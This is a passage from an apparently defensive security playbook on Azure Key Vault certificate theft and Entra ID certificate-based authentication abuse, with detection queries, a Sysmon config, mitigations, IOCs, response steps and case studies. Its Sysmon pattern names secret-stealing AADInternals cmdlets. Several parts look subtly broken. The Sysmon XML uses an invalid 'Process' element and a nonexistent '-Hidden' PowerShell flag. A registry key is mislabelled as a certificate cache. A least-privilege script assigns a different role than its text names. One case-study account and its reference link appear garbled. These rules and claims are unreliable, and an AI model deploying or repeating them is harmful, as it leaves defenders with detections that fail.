| summarize ExportCount = count() by Identity, CallerIpAddress
| where ExportCount > 5
"@ `
  -Severity "High" `
  -Enabled $true
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4887 (Certificate Services approved a certificate request and issued a certificate)**

- **Log Source:** Security
- **Trigger:** A certificate request is approved and issued
- **Filter:** Look for requests with `Subject Alternative Name (SAN)` values that don't match the requester's identity
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Certification Services**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **System Audit Policies** → **Object Access**
3. Enable: **Audit Certification Services**

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows

```xml
<!-- Detect AADInternals or certificate extraction tools -->
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Monitor for Mimikatz or AADInternals execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">powershell.exe -NoProfile -NonInteractive -Hidden;New-AADIntCertificate;Export-AADIntProxyAgentCertificates;Get-AADIntSyncCredentials;AADInternals</CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for certificate export operations -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Certificates</TargetObject>
    </RegistryEvent>
    
    <!-- Monitor for CryptoAPI certificate extraction -->
    <Process onmatch="include">
      <Image condition="contains">certutil.exe;certmgr.exe</Image>
    </Process>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Save the XML above to `sysmon-config.xml`
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Key Vault Access

**Alert Name:** "Unusual access to Key Vault detected"
- **Severity:** Medium/High
- **Description:** A service principal or user accessed Key Vault for certificate operations outside normal patterns
- **Applies To:** All subscriptions with Defender for Cloud enabled

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Storage**: ON (for Key Vault)
5. Click **Save**
6. Go to **Security alerts** → Filter by "Key Vault"

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Certificate-Based Authentication Changes

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for CBA-related operations
Search-UnifiedAuditLog -Operations "Update authentication method policy", "Add trusted certificate authority" `
  -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) | Export-Csv -Path "C:\audit_cba.csv"

# Search for key vault certificate exports
Search-UnifiedAuditLog -Operations "SecretGet", "CertificateGet" `
  -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "C:\audit_keyvault.csv"
```

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Disable Certificate-Based Authentication (if not required)**

Entra ID CBA should only be enabled for organizations that explicitly need it. Most organizations should keep it disabled.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication Methods**
2. Click on **Certificate-based authentication**
3. Toggle **Status** to **Disabled**
4. Click **Save**

**Manual Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

# Disable CBA
$body = @{
    isEnabled = $false
} | ConvertTo-Json

Invoke-MgGraphRequest -Method PATCH `
    -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig" `
    -Body $body
```

**Validation Command:**
```powershell
# Verify CBA is disabled
$cbaConfig = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig"

if ($cbaConfig.isEnabled -eq $false) {
    Write-Host "[✓] CBA is DISABLED - Good!"
} else {
    Write-Host "[!] CBA is ENABLED - Review required"
}
```

---

**Mitigation 2: Enforce Conditional Access for Certificate-Based Sign-ins**

If CBA must be enabled, enforce MFA and device compliance.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Require MFA for Certificate-Based Auth`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Client apps: **Mobile apps and desktop clients**, **Exchange ActiveSync clients**, **Modern authentication clients**
   - Authentication context: **Certificate-based authentication** (if available)
6. **Access controls:**
   - Grant: **Require multifactor authentication**
7. Enable policy: **On**
8. Click **Create**

---

**Mitigation 3: Restrict Key Vault Access with Least Privilege**

Only grant certificate export permissions to accounts that genuinely need them.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Key Vaults** → Select vault
2. Go to **Access Control (IAM)**
3. Click **+ Add** → **Add role assignment**
4. Role: **Key Vault Certificates Officer** (or Custom Role with minimal permissions)
5. Members: Select only required service principals/users
6. Click **Review + assign**

**Manual Steps (PowerShell):**
```powershell
$vaultName = "prod-kv-001"
$resourceGroup = "MyResourceGroup"
$principalId = "12345678-1234-1234-1234-123456789012"  # Service Principal ObjectId

# Assign minimal permissions
New-AzRoleAssignment -ResourceGroupName $resourceGroup `
  -ResourceName $vaultName `
  -ResourceType "Microsoft.KeyVault/vaults" `
  -RoleDefinitionName "Key Vault Secrets Officer" `
  -ObjectId $principalId
```

---

**Mitigation 4: Enable Key Vault Logging and Monitoring**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Key Vaults** → Select vault
2. Go to **Diagnostic settings**
3. Click **+ Add diagnostic setting**
4. Name: `KeyVault-Audit-Logs`
5. **Logs:** Check `AuditEvent` (certificate access)
6. **Metrics:** Check `All Metrics`
7. **Destination details:** Select Log Analytics workspace
8. Click **Save**

---

### Priority 2: HIGH

**Mitigation 5: Restrict Root CA Uploads to Global Admins Only**

Ensure only Global Administrators can add trusted certificate authorities.

**Manual Steps (PowerShell):**
```powershell
# Retrieve the current CBA config
$cbaConfig = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig"

# Review the trustedCertificateAuthorities list
$cbaConfig.trustedCertificateAuthorities | Select-Object @{Label="CA Name"; Expression={"$($_.displayName)"}}, CertificateThumbprint

# Remove any suspicious CAs
# (Manual review and deletion required - no bulk removal API available)
```

---

**Mitigation 6: Migrate Azure AD Connect to Cloud Sync (if possible)**

Azure AD Connect is a high-value target. Cloud Sync reduces the attack surface.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Cloud Sync**
2. Click **+ New Configuration**
3. Follow the wizard to configure cloud-based synchronization
4. Decommission on-premises Azure AD Connect servers

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Registry Keys:**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2` (certificate cache)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (AADInternals persistence)
- `HKLM\System\CurrentControlSet\Services\Kdc` (Kerberos configuration changes)

**Files:**
- `C:\temp\*.pfx` (exported certificates)
- `C:\Program Files\Microsoft Azure AD Connect\*` (AD Connect files)
- `%APPDATA%\AADInternals` (AADInternals artifacts)

**Network:**
- TCP 443 to `login.microsoftonline.com` (Azure authentication)
- TCP 443 to `*.vault.azure.net` (Key Vault API)
- TCP 443 to `graph.microsoft.com` (Microsoft Graph)

**Cloud (Entra ID/Azure):**
- `AuditLogs` table: OperationName = "Update authentication method policy", "Add trusted certificate authority"
- `SigninLogs` table: AuthenticationDetails contains "Certificate"
- `KeyVault` diagnostic logs: SecretGet, CertificateGet operations

### Forensic Artifacts

**Memory:**
- Lsass.exe process memory may contain certificate handles (accessible via Mimikatz)
- PowerShell history may show AADInternals commands

**Disk:**
- Event Viewer: Security log (Event IDs 4886, 4887)
- Key Vault diagnostic logs in Log Analytics workspace
- Unified Audit Log (Microsoft Purview)

**Azure/Cloud:**
- AuditLogs table (searchable via Sentinel KQL)
- SigninLogs for certificate-based authentications
- Key Vault activity logs (SecretGet, CertificateGet)

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable CBA immediately
Invoke-MgGraphRequest -Method PATCH `
    -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig" `
    -Body (@{ isEnabled = $false } | ConvertTo-Json)

# Remove malicious Root CAs
# (Requires manual identification and deletion)
```

**2. Collect Evidence:**

```powershell
# Export all authentication-related audit logs
Search-UnifiedAuditLog -Operations "Update authentication method policy" -StartDate (Get-Date).AddDays(-90) | Export-Csv "C:\forensics\auth_logs.csv"

# Export Key Vault certificate access logs
Search-UnifiedAuditLog -Operations "SecretGet", "CertificateGet" -StartDate (Get-Date).AddDays(-90) | Export-Csv "C:\forensics\keyvault_logs.csv"

# Collect sign-in logs
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgAuditLogSignIn -Filter "createdDateTime gt $(Get-Date).AddDays(-90)" | Export-Csv "C:\forensics\signin_logs.csv"
```

**3. Revoke Compromised Certificates:**

```powershell
# List all certificates in Key Vaults
Get-AzKeyVault | ForEach-Object { Get-AzKeyVaultCertificate -VaultName $_.VaultName }

# Revoke suspicious certificates (requires CA access)
# Contact the issuing CA to revoke the certificate by thumbprint
```

**4. Remediate:**

```powershell
# Reset passwords for all Global Admins and service principals
# Revoke all active sessions
# Enable MFA enforcement
# Review and restrict all app role assignments

# Re-enable CBA with strict Conditional Access policies
# Upload new, legitimate Root CAs (if needed)
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-TOKEN-001] Hybrid AD cloud token theft | Attacker obtains initial credentials via Azure AD Connect compromise |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Service principal is escalated to Directory.ReadWrite.All |
| **3** | **Current Step** | **[CERT-AZURE-001]** | **Azure Key Vault Certificate Theft / CBA Abuse** |
| **4** | **Persistence** | [CERT-M365-001] M365 Certificate Management Abuse | Attacker steals additional certificates from Key Vault |
| **5** | **Lateral Movement** | [CERT-FEDERATION-001] Federation Certificate Manipulation | Attacker forges federation certificates to compromise on-premises AD |
| **6** | **Impact** | [Data Exfiltration via Microsoft Graph] | Attacker uses compromised certificates to exfiltrate all tenant data |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT29 (Midnight Blizzard) - SolarWinds Supply Chain Attack (2020)

- **Target:** US Government agencies, Fortune 500 companies
- **Timeline:** Dec 2020 - Feb 2021
- **Technique Status:** Golden SAML attack; not direct Key Vault abuse but demonstrates federated cert theft
- **How They Used This:** Compromised SolarWinds Orion platform → Lateral movement to Azure AD Connect server → Exported ADFS token-signing certificate → Forged SAML tokens as Global Admins
- **Impact:** Months of undetected access to multiple cloud tenants; data exfiltration including classified government documents
- **Detection Failure:** Limited visibility into on-premises ADFS certificate exports; no correlation with cloud sign-ins
- **Reference:** [FireEye SolarWinds Analysis](https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-supply-chain-settlement.html)

---

### Example 2: Semperis Research - CBA Privilege Escalation (2022-2024)

- **Target:** Organizations with Entra ID and misconfigured service principals
- **Timeline:** July 2022 onwards
- **Technique Status:** Certificate-Based Authentication abuse with privilege escalation primitives
- **How They Used This:**
  1. Compromised a Cloud Application Administrator service principal
  2. Used it to enable CBA and upload malicious Root CA
  3. Forged certificates for Global Admin accounts
  4. Gained full tenant compromise without password or MFA
- **Impact:** Complete Azure, Microsoft 365, and federated application access
- **Detection Failure:** CBA enablement was logged but not correlated with subsequent certificate-based sign-ins
- **Reference:** [Semperis CBA Research](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)

---

### Example 3: Datadog Research - Federated Domain Escalation (2025)

- **Target:** Organizations with Domain.ReadWrite.All permissions in service principals
- **Timeline:** Ongoing (disclosed January 2025)
- **Technique Status:** Modern federated domain attack combining multiple T1649 sub-techniques
- **How They Used This:**
  1. Compromised a service principal with Domain.ReadWrite.All
  2. Added a new federated domain to the tenant
  3. Issued a certificate for that domain
  4. Forged SAML tokens for hybrid users with Global Admin role
  5. Gained complete tenant and on-premises AD access
- **Impact:** Compromise of both Azure and on-premises infrastructure
- **Detection Failure:** No visibility into federated domain changes at scale; certificate authority changes not monitored
- **Reference:** [Datadog I SPy Research](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

---

## SUMMARY

**CERT-AZURE-001: Azure Key Vault Certificate Theft** is a **CRITICAL** attack technique that enables persistent, passwordless access to Entra ID and Azure environments. Organizations must:

1. **Disable CBA** unless explicitly required
2. **Monitor certificate-related operations** in Key Vault and Entra ID
3. **Enforce Conditional Access policies** requiring MFA for certificate-based sign-ins
4. **Restrict Key Vault access** to minimal required principals
5. **Enable logging** on all authentication method changes
6. **Audit and remove** any suspicious Root CAs from the trusted list

The absence of visible evidence in traditional logs (password hash capture, process execution) makes this attack particularly dangerous and difficult to detect without dedicated certificate and identity logging.

---